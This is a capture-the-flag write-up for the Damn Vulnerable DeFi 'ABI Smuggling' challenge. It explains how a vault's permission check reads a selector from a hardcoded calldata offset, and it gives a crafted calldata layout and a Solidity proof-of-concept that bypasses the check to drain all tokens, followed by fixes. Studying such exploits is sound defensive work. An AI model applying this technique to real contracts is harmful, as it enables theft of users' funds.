# ABI Smuggling - Checking One Selector, Executing Another

**Challenge:** Damn Vulnerable DeFi v4 - ABI Smuggling
**Category:** Access Control Bypass / Calldata Decoding Mismatch
**Severity:** Critical (every token in the vault is drained by an account with no real permission to do so)

## What's going on

A vault holds 1,000,000 DVT and only lets permissioned (selector, caller, target)
triples execute through a generic `execute(target, actionData)` entry point. The
player is only authorized for `withdraw`, which is capped at 1 ETH every 15 days -
nowhere near enough to matter. The deployer alone is authorized for `sweepFunds`,
which drains the whole balance with no cap. The goal is for the player to walk away
with everything anyway.

## The bug

`AuthorizedExecutor.execute()` reads the selector it checks permissions against from a
**hardcoded byte offset** in calldata, rather than from wherever the real ABI-decoded
`actionData` parameter actually begins:

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
    bytes4 selector;
    uint256 calldataOffset = 4 + 32 * 3; // byte 100 -- assumes the "normal" layout
    assembly {
        selector := calldataload(calldataOffset)
    }
    if (!permissions[getActionId(selector, msg.sender, target)]) revert NotAllowed();
    _beforeFunctionCall(target, actionData);
    return target.functionCall(actionData);
}
```

Byte 100 only lines up with the real start of `actionData`'s contents when the dynamic
`bytes` parameter is encoded with its offset word at the canonical value (`0x40`) -
which is how `abi.encodeCall` would produce it, but calldata is attacker-supplied, so
nothing enforces that. Solidity's actual decoder for `bytes calldata actionData`
follows the **real offset word**, wherever the caller points it, when it builds the
`actionData` slice that eventually goes into `target.functionCall(actionData)`.

That gap lets an attacker construct calldata where:
- the fixed byte-100 position contains a selector they **are** authorized for, and
- the real offset word points somewhere else entirely, to a **different** selector
  and argument set they are **not** authorized for,

so the permission check and the executed call see two different functions.

## The attack

Hand-craft calldata for `execute(address,bytes)` with this layout:

```
bytes 0–3     execute(address,bytes) selector
bytes 4–35    target = address(vault)
bytes 36–67   actionData offset = 0x80 (128) -- NOT the canonical 0x40
bytes 68–99   filler, unused by anything
bytes 100–103 top 4 bytes = withdraw's selector (0xd9caed12) -- what the check reads
bytes 104–131 rest of that word, zero-padded
bytes 132–163 length word for the REAL actionData (68)
bytes 164–231 REAL actionData: sweepFunds(recovery, token)
```

`execute()` reads byte 100, sees `withdraw`'s selector, finds the player authorized
for it, and passes. It then calls `target.functionCall(actionData)` where
`actionData` was decoded following the real offset at byte 36 (`0x80` → byte 132) --
landing on `sweepFunds(recovery, token)` instead. The vault sweeps its entire balance
to `recovery`.

## PoC

```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    bytes memory sweepCall = abi.encodeWithSelector(
        SelfAuthorizedVault.sweepFunds.selector, recovery, address(token)
    );

    bytes memory attackCalldata = abi.encodePacked(
        vault.execute.selector,
        bytes32(uint256(uint160(address(vault)))),   // target
        bytes32(uint256(0x80)),                       // non-canonical actionData offset
        bytes32(uint256(0)),                          // filler
        bytes32(bytes4(vault.withdraw.selector)),     // fake selector at byte 100
        bytes32(uint256(sweepCall.length)),           // real length word
        sweepCall                                     // real actionData
    );

    (bool success, bytes memory ret) = address(vault).call(attackCalldata);
    require(success, string(ret));
}
```

Full test file: `test/abi-smuggling/ABISmuggling.t.sol`

## Why I'm calling this Critical

- **Complete bypass of the authorization model.** The permission system exists
  specifically to stop the player from calling `sweepFunds`, and it's defeated entirely.
- **Total loss of funds**, in a single call, by an account with explicitly scoped-down
  permissions.
- **No special access needed beyond what the player already has.** The player doesn't
  need the deployer's permission at all -- just a correctly shaped calldata blob.
- **The flaw is in the security mechanism itself**, not in a peripheral feature. The
  whole point of `AuthorizedExecutor` is to gate selectors; here the gate reads the
  wrong bytes.

## Fix

- Never read a selector (or any other value meant to govern access control) from a
  raw, hardcoded calldata offset when the same calldata is also going to be ABI-decoded
  normally downstream. The two interpretations must agree, and a fixed offset cannot
  guarantee that against attacker-supplied calldata.
- Decode `actionData` properly first (e.g. `abi.decode` into typed parameters, or at
  minimum take `bytes4(actionData[:4])` from the already-decoded `bytes` value, not
  from a `calldataload` at an assumed position), then check the selector taken from
  that decoded value.
- As a general rule: the value used in a security check and the value actually acted
  upon must be read from the exact same place, not two different interpretations of
  the same bytes.

## Takeaway

Whenever a contract both (a) inspects calldata directly via `calldataload`/fixed
offsets for a security decision, and (b) forwards that same calldata on for normal ABI
decoding and execution elsewhere, check whether those two readings are guaranteed to
agree. Dynamic ABI encoding (offsets, lengths) gives an attacker room to make the
"inspected" view and the "executed" view diverge -- this is the core of ABI smuggling,
and it shows up in real audits wherever permission checks peek at calldata instead of
trusting the decoded parameters.
